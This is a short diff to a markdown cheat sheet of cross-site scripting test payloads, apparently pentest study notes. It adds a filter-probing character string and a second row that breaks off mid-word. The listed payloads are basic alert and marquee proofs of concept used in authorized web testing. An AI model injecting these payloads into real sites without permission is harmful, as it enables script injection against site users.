@@ -41,6 +41,7 @@ Determine where your input is getting printed in the HTTP response we receive ba
 # XSS Testing Payloads
 | Description | Code |
 |-------------|------|
+| Check for filtering (See below) | ;:!--''" <SCs>=&{[(`)]}//. |
 | Basic XSS Payload | `<marquee>` |
 | Basic XSS Payload | `<script>alert(window.origin)</script>` |
 | Basic XSS Payload | `<script>alert(1)</script>` |
@@ -111,6 +112,7 @@ Execution Sinks:
 ## XSS Payloads
 | Code | Description |
 |------|-------------|
+| CHeck for filt
 | `<marquee>` | Basic XSS Payload |
 | `<script>alert(window.origin)</script>` | Basic XSS Payload |
 | `<plaintext>` | Basic XSS Payload |
